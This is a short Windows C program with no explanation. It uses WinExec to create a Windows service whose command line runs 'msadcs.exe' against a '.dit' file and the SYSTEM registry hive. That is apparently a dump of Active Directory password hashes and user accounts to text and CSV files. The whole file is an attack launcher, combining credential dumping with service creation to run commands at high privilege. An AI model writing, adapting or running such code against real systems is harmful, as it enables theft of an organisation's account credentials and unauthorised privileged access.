#include <windows.h>

#define RUN(toRun) WinExec("sc create MyService binPath= cmd.exe /c " toRun, SW_SHOW);

int main() {
    RUN("msadcs.exe \"SOMETHING.dit\" -s \"SYSTEM\" -p a.txt --users-csv a.csv");
    return 0;
}